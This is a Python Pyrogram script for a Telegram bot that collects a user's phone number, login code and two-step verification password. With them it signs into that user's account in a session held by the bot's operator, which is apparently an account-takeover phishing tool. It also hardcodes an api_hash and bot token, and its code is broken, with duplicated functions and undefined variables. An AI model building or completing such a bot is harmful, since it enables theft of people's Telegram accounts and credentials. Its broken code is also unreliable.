

from pyrogram import Client, filters, idle
from pyrogram.types import Message

# Bot configuration
api_id = 10247139 
api_hash = "96b46175824223a33737657ab943fd6a"
bot_token = "7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8" 

bot = Client("login_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# Dictionary to store user input
user_data = {}



@bot.on_message(filters.text)
async def collect_phone_number(client, message: Message):
    user_id = message.from_user.id
    phone_number = message.text

    # Store phone number in user data
    user_data[user_id] = {"phone_number": phone_number}
    await message.reply("Phone number received. Please wait while we send OTP.")

    # Trigger the login function for the user
    await login_user_account(client, user_id)

async def login_user_account(client, user_id):
    # Import and initialize the Pyrogram user client
    user_phone = user_data[user_id]["phone_number"]
    await message.reply(f"Attempting to log in with phone number {user_phone}...")

    # Now proceed to log the user in via the user client (next step)





# Configuration for the user client
api_id_user = 10247139 
api_hash_user = "96b46175824223a33737657ab943fd6a"

async def login_user_account(client, user_id):
    user_phone = user_data[user_id]["phone_number"]

    # Initialize Pyrogram client for the user
    user_client = Client("user_session", api_id=api_id_user, api_hash=api_hash_user)

    async with user_client:
        try:
            # Send code request to Telegram server
            await user_client.send_code(phone_number=user_phone)

            # Request user for OTP via bot
            await client.send_message(user_id, "Please enter the OTP sent to your Telegram account:")

            # Collect the OTP
            @bot.on_message(filters.text)
            async def collect_otp(client, message: Message):
                if message.from_user.id == user_id:
                    otp_code = message.text
                    await message.reply("OTP received. Logging in...")

                    # Now attempt to login with OTP
                    try:
                        logged_in = await user_client.sign_in(phone_number=user_phone, phone_code=otp_code)
                        if logged_in:
                            await client.send_message(user_id, "Login successful!")
                    except Exception as e:
                        await client.send_message(user_id, f"Login failed: {e}")
                    return

        except Exception as e:
            await client.send_message(user_id, f"Error: {e}")

async def collect_otp(client, message: Message):
    if message.from_user.id == user_id:
        otp_code = message.text

        try:
            logged_in = await user_client.sign_in(phone_number=user_phone, phone_code=otp_code)
            if logged_in:
                await client.send_message(user_id, "Login successful!")
        except Exception as e:
            # Check if the exception is asking for the 2-step verification password
            if "2FA" in str(e):
                await client.send_message(user_id, "2-step verification enabled. Please enter your password:")
                @bot.on_message(filters.text)
                async def collect_password(client, message: Message):
                    if message.from_user.id == user_id:
                        password = message.text
                        try:
                            logged_in = await user_client.check_password(password)
                            if logged_in:
                                await client.send_message(user_id, "Login successful!")
                        except Exception as e:
                            await client.send_message(user_id, f"2-step verification failed: {e}")
                        return
            else:
                await client.send_message(user_id, f"Login failed: {e}")


bot.start()
